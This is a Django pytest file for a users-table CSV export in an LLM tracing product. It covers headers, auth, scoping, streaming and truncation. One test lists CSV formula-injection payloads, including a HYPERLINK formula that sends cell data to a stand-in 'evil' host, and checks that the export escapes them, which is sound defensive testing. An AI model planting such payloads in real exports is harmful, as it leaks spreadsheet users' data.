import csv
import io
import json
import uuid
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

import pytest
from django.http import StreamingHttpResponse
from django.utils import timezone
from rest_framework import status

from tracer.serializers.trace import UsersTableRowSerializer
from tracer.services.clickhouse.query_service import AnalyticsQueryService
from tracer.services.users_list_manager import (
    MAX_EXPORT_ROWS,
    USERS_EXPORT_COLUMNS,
    UsersListManager,
    _users_attr_enrichment_query,
    _users_attr_id_map_query,
)

pytestmark = [pytest.mark.integration, pytest.mark.api]


def _date_filters(start, end):
    return [
        {
            "column_id": "start_time",
            "filter_config": {
                "filter_type": "datetime",
                "filter_op": "between",
                "filter_value": [start.isoformat(), end.isoformat()],
            },
        }
    ]


def _ch_stub(rows):
    return MagicMock(data=rows)


def _row(
    *,
    user_id,
    user_id_type="email",
    user_id_hash="hash",
    activated_at=None,
    last_active=None,
    num_traces=1,
    num_sessions=1,
    avg_session_duration=3.0,
    total_tokens=18,
    total_cost=0.123456,
    avg_trace_latency=300.0,
    num_llm_calls=1,
    num_guardrails_triggered=0,
    bool_eval_pass_rate=0.0,
    input_tokens=11,
    output_tokens=7,
    project_id=None,
    end_user_id=None,
    total_count=1,
):
    return {
        "user_id": user_id,
        "user_id_type": user_id_type,
        "user_id_hash": user_id_hash,
        "activated_at": activated_at or datetime.utcnow(),
        "last_active": last_active,
        "num_traces": num_traces,
        "num_sessions": num_sessions,
        "avg_session_duration": avg_session_duration,
        "total_tokens": total_tokens,
        "total_cost": total_cost,
        "avg_trace_latency": avg_trace_latency,
        "num_llm_calls": num_llm_calls,
        "num_guardrails_triggered": num_guardrails_triggered,
        "bool_eval_pass_rate": bool_eval_pass_rate,
        "input_tokens": input_tokens,
        "output_tokens": output_tokens,
        "project_id": project_id or uuid.uuid4(),
        "end_user_id": end_user_id or uuid.uuid4(),
        "num_active_days": 1,
        "num_traces_with_errors": 0,
        "avg_output_float": 0.0,
        "total_count": total_count,
    }


# Header order is the frontend contract; if the view drifts, these tests catch it.
_EXPECTED_HEADER = [
    "User ID",
    "User ID Type",
    "User ID Hash",
    "First Active",
    "Last Active",
    "No. of Traces",
    "No. of Sessions",
    "Avg Session Duration (s)",
    "Total Tokens",
    "Total Cost ($)",
    "Avg Latency / Trace (ms)",
    "No. of LLM Calls",
    "Guardrails Triggered",
    "Evals Pass Rate (%)",
    "Input Tokens",
    "Output Tokens",
]


def _parse_csv(response):
    body = b"".join(response.streaming_content).decode("utf-8")
    return list(csv.reader(io.StringIO(body)))


class TestUsersExport:
    def test_export_streams_csv_with_correct_headers(
        self, auth_client, organization, workspace, observe_project
    ):
        user_id = "export-happy@example.com"
        now = timezone.now()
        activated = now - timedelta(days=1)
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
        rows = [
            _row(
                user_id=user_id,
                activated_at=activated,
                last_active=now,
                total_tokens=18,
                input_tokens=11,
                output_tokens=7,
                num_traces=1,
                project_id=observe_project.id,
            )
        ]

        with (
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub(rows),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "export": "true",
                },
            )
            # Rows stream lazily, so the body must be consumed while the CH stub
            # is still patched (this also proves the fetch is not eager).
            csv_rows = _parse_csv(response)

        assert response.status_code == status.HTTP_200_OK
        # Response type only: the header-first / mid-stream-failure behaviour that
        # actually keeps the socket warm is asserted in the dedicated tests below.
        assert isinstance(response, StreamingHttpResponse)
        assert response["Content-Type"].startswith("text/csv")
        # The backend marks it a download but does NOT name it — the frontend
        # owns the filename, so there must be no server-side `filename=`.
        assert response["Content-Disposition"] == "attachment"
        assert "filename=" not in response["Content-Disposition"]

        assert csv_rows[0] == _EXPECTED_HEADER
        data_rows = [r for r in csv_rows[1:] if r]
        target = next(r for r in data_rows if r[0] == user_id)
        assert target[_EXPECTED_HEADER.index("User ID Type")] == "email"
        assert target[_EXPECTED_HEADER.index("Total Tokens")] == "18"
        assert target[_EXPECTED_HEADER.index("Input Tokens")] == "11"
        assert target[_EXPECTED_HEADER.index("Output Tokens")] == "7"
        assert target[_EXPECTED_HEADER.index("No. of Traces")] == "1"
        # Datetimes go through _format_export_cell → isoformat().
        assert target[_EXPECTED_HEADER.index("First Active")] == activated.isoformat()
        assert target[_EXPECTED_HEADER.index("Last Active")] == now.isoformat()

    def test_export_requires_authentication(self, api_client, observe_project):
        response = api_client.get(
            "/tracer/users/",
            {"project_id": str(observe_project.id), "export": "true"},
        )
        assert response.status_code in (
            status.HTTP_401_UNAUTHORIZED,
            status.HTTP_403_FORBIDDEN,
        )

    def test_export_ignores_pagination_params(
        self, auth_client, organization, workspace, observe_project
    ):
        now = timezone.now()
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
        user_ids = [f"export-page-{i}@example.com" for i in range(3)]
        rows = [_row(user_id=uid, project_id=observe_project.id) for uid in user_ids]

        with (
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub(rows),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "export": "true",
                    "page_size": 1,
                    "current_page_index": 2,
                },
            )
            csv_rows = _parse_csv(response)

        assert response.status_code == status.HTTP_200_OK
        emitted = {r[0] for r in csv_rows[1:] if r}
        for uid in user_ids:
            assert uid in emitted

    def test_export_skips_pagination_in_builder_kwargs(
        self, auth_client, organization, workspace, observe_project
    ):
        now = timezone.now()
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))

        with (
            patch(
                "tracer.services.users_list_manager.UserListQueryBuilderV2",
                wraps=__import__(
                    "tracer.services.clickhouse.v2.query_builders.user_list",
                    fromlist=["UserListQueryBuilderV2"],
                ).UserListQueryBuilderV2,
            ) as builder_cls,
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub([]),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "export": "true",
                    "page_size": 5,
                    "current_page_index": 3,
                },
            )
            # Consume the stream so the lazy fetch (and the builder) actually runs.
            _parse_csv(response)

        assert response.status_code == status.HTTP_200_OK
        builder_cls.assert_called_once()
        kwargs = builder_cls.call_args.kwargs
        assert kwargs["limit"] is None
        assert kwargs["offset"] is None
        # Export is unpaginated but capped: the builder gets a hard row ceiling
        # (cap + 1 so a truncation can be distinguished from a full page).
        assert kwargs["max_rows"] == MAX_EXPORT_ROWS + 1
        assert kwargs["filters"] == filters
        # Post-CH25: workspace isolation rides on project_ids + empty_scope.
        # Project requested IS in the workspace, so empty_scope must be False
        # and project_ids must contain the requested project.
        assert kwargs["project_ids"] == [str(observe_project.id)]
        assert kwargs["empty_scope"] is False

    def test_export_forwards_search_and_sort_to_builder(
        self, auth_client, organization, workspace, observe_project
    ):
        # The export must match a searched/sorted grid, not just the filter set:
        # `search` and `sort_params` have to reach the builder verbatim. Regression
        # guard for the bug where the CSV ignored both.
        now = timezone.now()
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
        sort_params = [{"column_id": "num_traces", "direction": "desc"}]

        with (
            patch(
                "tracer.services.users_list_manager.UserListQueryBuilderV2",
                wraps=__import__(
                    "tracer.services.clickhouse.v2.query_builders.user_list",
                    fromlist=["UserListQueryBuilderV2"],
                ).UserListQueryBuilderV2,
            ) as builder_cls,
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub([]),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "search": "alice",
                    "sort_params": json.dumps(sort_params),
                    "export": "true",
                },
            )
            _parse_csv(response)

        assert response.status_code == status.HTTP_200_OK
        kwargs = builder_cls.call_args.kwargs
        assert kwargs["search"] == "alice"
        assert kwargs["sort_params"] == sort_params

    def test_export_formats_none_cells_as_empty(
        self, auth_client, organization, workspace, observe_project
    ):
        now = timezone.now()
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
        rows = [
            _row(
                user_id="export-idle@example.com",
                last_active=None,
                project_id=observe_project.id,
            )
        ]

        with (
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub(rows),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "export": "true",
                },
            )
            csv_rows = _parse_csv(response)

        data_row = next(r for r in csv_rows[1:] if r)
        assert data_row[_EXPECTED_HEADER.index("Last Active")] == ""

    @pytest.mark.parametrize(
        "raw_user_id",
        [
            '=HYPERLINK("http://evil/?"&A1,"x")',
            "@SUM(A1:A2)",
            "+1+1",
            "-2+3",
            "\tlead-tab",
            "\rlead-cr",
        ],
    )
    def test_export_escapes_formula_cells(
        self, auth_client, organization, workspace, observe_project, raw_user_id
    ):
        # user_id is customer-controlled (end-user IDs come from the customer's
        # own instrumentation). A cell starting with = + - @ tab or CR executes
        # as a formula when the CSV is opened in Excel/Sheets, so the export
        # must prefix it with a single quote.
        now = timezone.now()
        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
        rows = [_row(user_id=raw_user_id, project_id=observe_project.id)]

        with (
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub(rows),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {
                    "project_id": str(observe_project.id),
                    "filters": json.dumps(filters),
                    "export": "true",
                },
            )
            csv_rows = _parse_csv(response)

        data_row = next(r for r in csv_rows[1:] if r)
        cell = data_row[_EXPECTED_HEADER.index("User ID")]
        assert cell == "'" + raw_user_id
        assert cell[0] == "'"

    def test_export_returns_only_header_when_project_out_of_scope(
        self, auth_client, organization, workspace, observe_project
    ):
        # Random UUID NOT in this user's workspace.
        foreign_project_id = str(uuid.uuid4())

        with (
            patch(
                "tracer.services.users_list_manager.UserListQueryBuilderV2",
                wraps=__import__(
                    "tracer.services.clickhouse.v2.query_builders.user_list",
                    fromlist=["UserListQueryBuilderV2"],
                ).UserListQueryBuilderV2,
            ) as builder_cls,
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                return_value=_ch_stub([]),
            ),
        ):
            response = auth_client.get(
                "/tracer/users/",
                {"project_id": foreign_project_id, "export": "true"},
            )
            # Consume inside the patch so the lazy fetch / builder runs here.
            csv_rows = _parse_csv(response)

        assert response.status_code == status.HTTP_200_OK
        # Builder must be told the scope is empty so the SQL contracts to "no rows"
        # rather than falling through to an org-wide scan.
        kwargs = builder_cls.call_args.kwargs
        assert kwargs["empty_scope"] is True
        assert kwargs["project_ids"] == []

        # Response is still a valid streamed CSV with just the header row.
        assert csv_rows[0] == _EXPECTED_HEADER
        assert [r for r in csv_rows[1:] if r] == []


class TestUserListQueryBuilderUnpaginated:
    def test_unpaginated_query_omits_window_count(self):
        from tracer.services.clickhouse.query_builders.user_list import (
            UserListQueryBuilder,
        )

        builder = UserListQueryBuilder(
            organization_id=str(uuid.uuid4()),
            project_ids=[str(uuid.uuid4())],
            limit=None,
            offset=None,
        )
        query, _ = builder.build()
        assert "count() OVER()" not in query
        assert "LIMIT %(limit)s" not in query
        assert "0 AS total_count" in query

    def test_paginated_query_keeps_window_count(self):
        from tracer.services.clickhouse.query_builders.user_list import (
            UserListQueryBuilder,
        )

        builder = UserListQueryBuilder(
            organization_id=str(uuid.uuid4()),
            project_ids=[str(uuid.uuid4())],
            limit=30,
            offset=0,
        )
        query, _ = builder.build()
        assert "count() OVER() AS total_count" in query
        assert "LIMIT %(limit)s OFFSET %(offset)s" in query

    def test_export_cap_limits_without_window_count(self):
        from tracer.services.clickhouse.query_builders.user_list import (
            UserListQueryBuilder,
        )

        builder = UserListQueryBuilder(
            organization_id=str(uuid.uuid4()),
            project_ids=[str(uuid.uuid4())],
            limit=None,
            offset=None,
            max_rows=10_000,
        )
        query, params = builder.build()
        # The export cap applies a LIMIT but NOT the window count, so CH streams
        # the ordered scan up to the cap instead of materializing a worktable.
        assert "LIMIT %(max_rows)s" in query
        assert "count() OVER()" not in query
        assert params["max_rows"] == 10_000


class TestUsersAttributeEnrichment:
    def test_query_filters_by_scoped_projects_and_raw_end_user_ids(self):
        project_ids = [str(uuid.uuid4()), str(uuid.uuid4())]

        query, params = _users_attr_enrichment_query(project_ids)

        assert "PREWHERE project_id IN %(attr_project_ids)s" in query
        assert "end_user_id IN %(attr_span_eu_ids)s" in query
        assert "idx_end_user_id" not in query
        assert "end_user_id_remap" not in query
        assert "resolved_end_user_id" not in query
        assert "SETTINGS" in query
        assert params["attr_project_ids"] == tuple(project_ids)

    def test_id_map_query_limits_survivor_map_to_page_groups(self):
        query, params = _users_attr_id_map_query()

        assert "WITH relevant_new_ids AS" in query
        assert "old_id IN %(page_eu_ids)s" in query
        assert "new_id IN %(page_eu_ids)s" in query
        assert "new_id IN (SELECT new_id FROM relevant_new_ids)" in query
        assert "arrayJoin([old_id, new_id]) AS any_id" in query
        assert "argMin(old_id, toString(old_id)) OVER" in query
        assert "SETTINGS" in query
        assert params == {}

    def test_enrichment_merges_all_group_members_into_survivor(self):
        project_ids = [str(uuid.uuid4()), str(uuid.uuid4())]
        survivor_id = str(uuid.uuid4())
        old_id = str(uuid.uuid4())
        new_id = str(uuid.uuid4())
        rows = [{"user_id": "u1", "end_user_id": survivor_id}]
        manager = UsersListManager(
            organization_id=str(uuid.uuid4()),
            allowed_project_ids=project_ids,
        )
        remap_rows = [
            {"any_id": survivor_id, "survivor_id": survivor_id},
            {"any_id": old_id, "survivor_id": survivor_id},
            {"any_id": new_id, "survivor_id": survivor_id},
        ]
        attribute_rows = [
            {
                "end_user_id": survivor_id,
                "attributes_extra": "{}",
                "attrs_string": {"customer.plan": "enterprise"},
                "attrs_number": {},
            },
            {
                "end_user_id": old_id,
                "attributes_extra": "{}",
                "attrs_string": {"customer.plan": "free"},
                "attrs_number": {},
            },
            {
                "end_user_id": new_id,
                "attributes_extra": "{}",
                "attrs_string": {"customer.plan": "pro"},
                "attrs_number": {},
            },
        ]

        with patch.object(
            AnalyticsQueryService,
            "execute_ch_query",
            side_effect=[_ch_stub(remap_rows), _ch_stub(attribute_rows)],
        ) as execute:
            manager._enrich_with_span_attributes(rows)

        assert rows[0]["customer.plan"] == ["enterprise", "free", "pro"]
        assert execute.call_count == 2
        assert execute.call_args_list[0].args[1]["page_eu_ids"] == (
            survivor_id,
        )
        attr_params = execute.call_args_list[1].args[1]
        assert attr_params["attr_project_ids"] == tuple(project_ids)
        assert set(attr_params["attr_span_eu_ids"]) == {
            survivor_id,
            old_id,
            new_id,
        }

    def test_enrichment_keeps_unmapped_user_as_identity(self):
        project_id = str(uuid.uuid4())
        end_user_id = str(uuid.uuid4())
        rows = [{"user_id": "u1", "end_user_id": end_user_id}]
        manager = UsersListManager(
            organization_id=str(uuid.uuid4()),
            allowed_project_ids=[project_id],
            project_id=project_id,
        )
        attribute_rows = [
            {
                "end_user_id": end_user_id,
                "attributes_extra": '{"customer.region": "us"}',
                "attrs_string": {},
                "attrs_number": {},
            }
        ]

        with patch.object(
            AnalyticsQueryService,
            "execute_ch_query",
            side_effect=[_ch_stub([]), _ch_stub(attribute_rows)],
        ) as execute:
            manager._enrich_with_span_attributes(rows)

        assert rows[0]["customer.region"] == "us"
        assert execute.call_args_list[1].args[1]["attr_span_eu_ids"] == (
            end_user_id,
        )

    def test_enrichment_does_not_relabel_non_survivor_page_row(self):
        project_id = str(uuid.uuid4())
        page_end_user_id = str(uuid.uuid4())
        survivor_id = str(uuid.uuid4())
        rows = [{"user_id": "u1", "end_user_id": page_end_user_id}]
        manager = UsersListManager(
            organization_id=str(uuid.uuid4()),
            allowed_project_ids=[project_id],
            project_id=project_id,
        )

        with patch.object(
            AnalyticsQueryService,
            "execute_ch_query",
            return_value=_ch_stub(
                [{"any_id": page_end_user_id, "survivor_id": survivor_id}]
            ),
        ) as execute:
            manager._enrich_with_span_attributes(rows)

        assert rows == [{"user_id": "u1", "end_user_id": page_end_user_id}]
        assert execute.call_count == 1


class TestUsersExportStreaming:
    """Manager-level streaming behaviour (no HTTP / no ClickHouse)."""

    @staticmethod
    def _manager():
        pid = str(uuid.uuid4())
        return UsersListManager(
            organization_id=str(uuid.uuid4()),
            allowed_project_ids=[pid],
            project_id=pid,
        )

    def test_export_yields_header_before_fetch(self):
        # The header row must be produced BEFORE the (slow) CH fetch, so the
        # socket starts streaming immediately instead of idling past the LB
        # read timeout.
        manager = self._manager()
        with patch.object(
            UsersListManager, "_fetch_rows", return_value=([], 0, MagicMock())
        ) as fetch:
            gen = manager.iter_export_csv()
            first_chunk = next(gen)
            assert fetch.call_count == 0  # header emitted before any fetch
            list(gen)  # drain the rest
            assert fetch.call_count == 1

        header = next(csv.reader(io.StringIO(first_chunk)))
        assert header == [h for h, _ in USERS_EXPORT_COLUMNS]

    def test_export_signals_failure_mid_stream(self):
        # A failure after headers are sent can't change the 200 status, so it
        # must be signalled in-band rather than read as a clean partial download.
        manager = self._manager()
        with patch.object(
            UsersListManager, "_fetch_rows", side_effect=RuntimeError("ch down")
        ):
            body = "".join(manager.iter_export_csv())

        rows = [r for r in csv.reader(io.StringIO(body)) if r]
        assert rows[0] == [h for h, _ in USERS_EXPORT_COLUMNS]
        assert any("export failed" in r[0] for r in rows[1:])

    def test_export_caps_rows_and_signals_truncation(self):
        manager = self._manager()
        oversized = [
            {"user_id": f"u{i}", "end_user_id": uuid.uuid4()}
            for i in range(MAX_EXPORT_ROWS + 5)
        ]
        with patch.object(UsersListManager, "_fetch_rows", return_value=(oversized, 0, MagicMock())):
            body = "".join(manager.iter_export_csv())

        rows = [r for r in csv.reader(io.StringIO(body)) if r]
        data_rows = rows[1:]  # drop header
        marker = data_rows[-1]
        assert "truncated" in marker[0]
        assert len(data_rows[:-1]) == MAX_EXPORT_ROWS

    def test_list_enrichment_fails_open(self):
        # The list path enriches rows with span attributes; if that secondary
        # query fails it must log and return the base rows, not 500 the list.
        manager = self._manager()
        base_rows = [{"user_id": "u1", "end_user_id": uuid.uuid4()}]
        with (
            patch.object(UsersListManager, "_fetch_rows", return_value=(base_rows, 1, MagicMock())),
            patch.object(
                AnalyticsQueryService,
                "execute_ch_query",
                side_effect=RuntimeError("attr query down"),
            ),
        ):
            payload = manager.list_payload(page_size=30, current_page=0)

        assert payload["table"] == base_rows
        assert payload["total_count"] == 1

    def test_export_columns_match_serializer_fields(self):
        # The CSV columns must stay a subset of the JSON contract's serializer
        # fields, so the export can't silently drift from the list response.
        serializer_fields = set(UsersTableRowSerializer().fields.keys())
        export_fields = {field for _, field in USERS_EXPORT_COLUMNS}
        missing = export_fields - serializer_fields
        assert not missing, f"export columns not on serializer: {missing}"
